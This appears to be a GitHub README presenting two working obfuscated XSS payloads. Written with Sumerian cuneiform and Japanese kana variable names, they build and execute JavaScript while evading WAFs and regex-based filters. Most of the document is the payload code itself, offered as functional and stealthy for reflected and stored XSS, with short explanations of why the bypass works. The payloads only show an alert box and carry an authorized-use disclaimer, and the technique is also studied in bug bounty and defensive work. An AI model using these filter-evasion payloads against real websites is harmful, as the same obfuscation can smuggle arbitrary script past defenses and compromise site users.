
# 🧠 Unicode-Based XSS Payloads – Ancient Scripts vs. Modern Filters
![Unicode-Based XSS Payloads - CyberSecPlayground](https://github.com/user-attachments/assets/5cec7fdd-476a-4ab3-a1e4-998cb7ae4048)

## Overview

This file demonstrates **Unicode-obfuscated XSS (Cross-Site Scripting)** payloads that leverage non-standard Unicode characters such as **Sumerian Cuneiform** and **Japanese Kana** to bypass naive input filters, WAFs, or static regex-based sanitization. These payloads are functional, stealthy, and great for both **bug bounty testing** and **educational demonstrations**.

---

## Payload 1: Sumerian Cuneiform Unicode XSS

```js
𒀱='',𒁍=!𒀱+𒀱,𒂖=!𒁍+𒀱,𒃵=𒀱+{},𒄿=𒁍[𒀱++],𒅗=𒁍[𒀲=𒀱],
𒆜=++𒀲+𒀱,𒇻=𒃵[𒀲+𒆜],
𒁍[𒇻+=𒃵[𒀱]+(𒁍.𒂖+𒃵)[𒀱]+𒂖[𒆜]+𒄿+𒅗+𒁍[𒀲]+𒇻+𒄿+𒃵[𒀱]+𒅗][𒇻](𒂖[𒀱]+𒂖[𒀲]+𒁍[𒆜]+𒅗+𒄿+"('𒀱𒀲𒀱𒋻𒆜𒀲𒁂𒐫𒉿𒀜𒅔')")()
```

### ✅ Explanation:

- Uses valid Unicode cuneiform characters as JavaScript variable names.
- Dynamically constructs and executes: `alert('𒀱𒀲𒀱𒋻𒆜𒀲𒁂𒐫𒉿𒀜𒅔')`
- Evades traditional filters and regex-based protection.
- Excellent for bypassing naive WAFs or static filters.

---

## Payload 2: Japanese Kana Unicode XSS

```js
あ='',い=!あ+あ,う=!い+あ,え=あ+{},お=い[あ++],か=い[き=あ],
く=++き+あ,け=え[き+く],
い[け+=え[あ]+(い.う+え)[あ]+う[く]+お+か+い[き]+け+お+え[あ]+か][け](う[あ]+う[き]+い[く]+か+お+"('ハッキングされました')")()
```

### ✅ Explanation:

- Obfuscated JS using Japanese Hiragana characters.
- Gradually builds and executes: `alert('ハッキングされました')`
- Functions identically to standard `alert()` payloads.
- Unicode characters are allowed as JS identifiers, so they bypass many basic filters.

---

## 🔍 Why These Work

- **JavaScript supports Unicode variable names**, so these are parsed and executed just like any normal code.
- **WAFs and static filters** often scan for common patterns like `alert`, `script`, or standard ASCII payloads. These bypass such patterns.
- Great for **reflected XSS**, **stored XSS**, or **CTF-style evasions**.

---

## ⚠️ Disclaimer

These payloads are intended for educational use in **authorized environments only**. Never use them for illegal activities.

---

## 📡 Follow Us

- 🔗 Telegram: [@cybersecplayground](https://t.me/cybersecplayground)
- 🔗 GitHub: [https://github.com/cybersecplayground](https://github.com/cybersecplayground)
- 🔗 Medium: [https://medium.com/@cybersecplayground](https://medium.com/@cybersecplayground)

### 🏷 Tags:
`#XSS` `#UnicodeXSS` `#BugBounty` `#infosec` `#websecurity` `#WAFBypass` `#cybersecplayground`
